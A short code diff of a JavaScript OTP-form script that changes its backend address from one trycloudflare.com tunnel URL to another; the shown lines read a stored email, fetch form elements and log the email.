@@ -2,7 +2,7 @@ const formOtp = document.getElementById('formOtp');
 const emailOtp = localStorage.getItem('email1');
 const otp1 = document.getElementById('otp');
 const p12 = document.getElementById('p12')
-const address = 'https://calm-arguments-powerful-malpractice.trycloudflare.com';
+const address = 'https://bundle-sku-websites-administrative.trycloudflare.com';
 console.log(emailOtp);
 console.log('Loaded:', localStorage.getItem('email1'));
 formOtp.addEventListener('submit', async function(e) {
